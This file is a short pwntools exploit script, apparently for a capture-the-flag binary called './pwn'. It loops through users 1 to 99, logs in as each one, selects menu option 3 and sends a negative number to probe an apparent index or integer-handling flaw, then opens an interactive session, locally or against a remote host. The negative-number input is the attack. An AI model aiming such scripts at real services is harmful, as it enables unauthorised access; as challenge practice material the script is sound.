#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./pwn', checksec=False)
libc = elf.libc

def setup():
    if args.REMOTE:
        p = remote(sys.argv[1], sys.argv[2])
    else:
        p = process(elf.path)
        context.terminal = ['tmux', 'splitw', '-h']
        if args.GDB:
            gdb.attach(p, gdbscript='''
            ''')
    
    return p

for i in range(1, 100):
    p = setup()
    log.info(f'Login as user{i}')

    p.sendlineafter(b'login:', f'user{i}'.encode())
    p.sendlineafter(b'choice>> ', b'3')
    p.sendlineafter(b'choice>> ', f'-{i}')
    p.interactive()